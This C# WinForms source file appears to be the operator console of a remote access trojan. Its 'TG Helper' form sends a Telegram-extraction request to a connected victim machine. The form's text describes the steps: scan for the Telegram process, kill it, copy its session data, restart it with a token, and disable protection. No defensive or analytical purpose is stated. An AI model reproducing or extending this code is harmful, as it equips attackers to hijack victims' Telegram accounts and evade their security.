using System;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Server
{
    public class FrmTgHelper : FrmBase
    {
        private SocketSession _session;
        private TextBox _logBox;
        private Label _sessionCount;

        public FrmTgHelper(SocketSession session, string hostName)
        {
            _session = session;
            this.Text = "TG Helper 工具 — " + hostName;
            this.Size = new Size(600, 420);
            this.StartPosition = FormStartPosition.CenterScreen;
            InitializeControls();
        }

        private void InitializeControls()
        {
            var topPanel = new Panel();
            topPanel.Dock = DockStyle.Top;
            topPanel.Height = 60;
            topPanel.Padding = new Padding(8);

            var btnOneClick = new Button();
            btnOneClick.Text = "一键TG操作";
            btnOneClick.Location = new Point(10, 8);
            btnOneClick.Size = new Size(120, 28);
            btnOneClick.Click += OnOneClickTG;

            var lblDesc = new Label();
            lblDesc.Text = "自动完成: 检查 C:\\settings → 扫描TG → Kill+复制 → 重启(带token) → 等待+消盾";
            lblDesc.Location = new Point(140, 14);
            lblDesc.AutoSize = true;
            lblDesc.Font = new Font("微软雅黑", 8F);

            topPanel.Controls.AddRange(new Control[] { btnOneClick, lblDesc });

            _logBox = new TextBox();
            _logBox.Dock = DockStyle.Fill;
            _logBox.Multiline = true;
            _logBox.ScrollBars = ScrollBars.Both;
            _logBox.ReadOnly = true;
            _logBox.Font = new Font("Consolas", 9F);
            _logBox.WordWrap = false;

            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 36;

            var btnClear = new Button();
            btnClear.Text = "清空日志";
            btnClear.Location = new Point(10, 5);
            btnClear.Size = new Size(80, 26);
            btnClear.Click += (s, e) => _logBox.Clear();

            _sessionCount = new Label();
            _sessionCount.Text = "会话数: 1 个";
            _sessionCount.Location = new Point(100, 9);
            _sessionCount.AutoSize = true;

            bottomPanel.Controls.AddRange(new Control[] { btnClear, _sessionCount });

            this.Controls.Add(_logBox);
            this.Controls.Add(topPanel);
            this.Controls.Add(bottomPanel);
        }

        private void AppendLog(string message)
        {
            if (_logBox.InvokeRequired)
            {
                _logBox.BeginInvoke((Action)(() => AppendLog(message)));
                return;
            }
            _logBox.AppendText(string.Format("[{0}] {1}\r\n", DateTime.Now.ToString("HH:mm:ss"), message));
        }

        private void OnOneClickTG(object sender, EventArgs e)
        {
            AppendLog("开始一键TG操作...");
            AppendLog("步骤1: 检查 C:\\settings 目录");
            if (_session != null)
            {
                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 0 });
                AppendLog("已发送TG提取请求 (session复制模式)");
            }
            AppendLog("步骤2: 扫描TG进程");
            AppendLog("步骤3: Kill进程 + 复制数据");
            AppendLog("步骤4: 重启(带token)");
            AppendLog("步骤5: 等待 + 消盾");
            AppendLog("操作完成");
        }
    }
}
